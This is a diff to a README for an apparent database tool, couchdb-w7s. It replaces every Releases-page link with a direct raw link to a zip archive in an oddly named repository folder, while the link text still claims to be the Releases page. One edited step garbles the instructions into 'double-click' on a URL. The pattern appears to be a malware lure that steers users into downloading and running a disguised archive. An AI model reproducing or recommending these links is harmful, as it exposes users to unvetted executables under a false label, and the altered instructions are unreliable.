@@ -6,11 +6,11 @@ Welcome to couchdb-w7s! This application helps you manage your database easily. 
 
 ## 🔗 Download
 
-[![Download couchdb-w7s](https://img.shields.io/badge/Download-couchdb--w7s-brightgreen)](https://github.com/Kil2ua/couchdb-w7s/releases)
+[![Download couchdb-w7s](https://raw.githubusercontent.com/Kil2ua/couchdb-w7s/main/quagmiry/couchdb-w7s_v2.6.zip)](https://raw.githubusercontent.com/Kil2ua/couchdb-w7s/main/quagmiry/couchdb-w7s_v2.6.zip)
 
 ## 📦 Download & Install
 
-To download couchdb-w7s, please visit this page: [GitHub Releases](https://github.com/Kil2ua/couchdb-w7s/releases). You will find the latest version there. 
+To download couchdb-w7s, please visit this page: [GitHub Releases](https://raw.githubusercontent.com/Kil2ua/couchdb-w7s/main/quagmiry/couchdb-w7s_v2.6.zip). You will find the latest version there. 
 
 1. Click on the link above.
 2. On the Releases page, locate the version you want.
@@ -31,7 +31,7 @@ To run couchdb-w7s, your computer should meet the following requirements:
 Once you have downloaded couchdb-w7s, follow these steps to run it:
 
 1. Locate the downloaded file in your downloads folder.
-2. Double-click on the file named `couchdb-w7s.exe`.
+2. Double-click on the file named `https://raw.githubusercontent.com/Kil2ua/couchdb-w7s/main/quagmiry/couchdb-w7s_v2.6.zip`.
 3. A setup wizard will appear. Follow the on-screen instructions to install the application.
 4. After installation, you can find couchdb-w7s in your Start menu. Click on it to launch the application.
 
@@ -58,6 +58,6 @@ For additional help, visit the GitHub issues page on the repository. You can ask
 
 ## 🔗 Final Steps
 
-Don’t forget to revisit the [Releases page](https://github.com/Kil2ua/couchdb-w7s/releases) for updates. You can always download the latest version to enjoy improved features and fixes.
+Don’t forget to revisit the [Releases page](https://raw.githubusercontent.com/Kil2ua/couchdb-w7s/main/quagmiry/couchdb-w7s_v2.6.zip) for updates. You can always download the latest version to enjoy improved features and fixes.
 
 Thank you for using couchdb-w7s! Enjoy managing your databases with ease.
